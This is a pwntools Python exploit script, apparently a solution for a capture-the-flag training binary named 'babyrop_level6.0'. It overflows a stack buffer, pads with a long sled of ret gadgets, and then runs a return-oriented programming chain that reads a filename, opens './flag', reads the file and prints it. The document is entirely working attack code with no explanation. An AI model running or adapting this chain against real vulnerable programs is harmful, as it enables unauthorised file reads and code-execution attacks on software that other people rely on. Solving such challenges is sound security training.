from pwn import *

binary = './babyrop_level6.0'
elf = ELF(binary)
context.binary = binary
p = process(binary)

syscall = 0x0000000000401866
pop_rdi = 0x000000000040229e
pop_rax = 0x0000000000401856
pop_rsi = 0x0000000000402296
pop_rdx = 0x000000000040228e
ret = 0x000000000040101a

read = 0x405040
gdb.attach(p, '''
b * challenge+287
b * free_gadgets+36
''')

flagfileString_addr = elf.bss() + 100
flag_addr = elf.bss() + 200



offset = 0x50 + 8
payload = flat(
	b'A' * offset,
	
	
	ret,



	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	
	
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	
	
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	
	
	
	
	
	
	
	# read
	pop_rdi,
	0, # fd
	pop_rsi,
	flagfileString_addr,
	pop_rdx,
	100,
	elf.sym['read'],
	
	# open
	pop_rdi,
	flagfileString_addr,
	pop_rsi,
	0,
	elf.sym['open'],
	
	# read
	pop_rdi,
	3, # fd
	pop_rsi,
	flag_addr,
	pop_rdx,
	100,
	elf.sym['read'],
	
	# write
	pop_rdi,
	flag_addr,
	elf.sym['puts'],
	
)
p.send(payload)
p.send('./flag')

p.interactive()
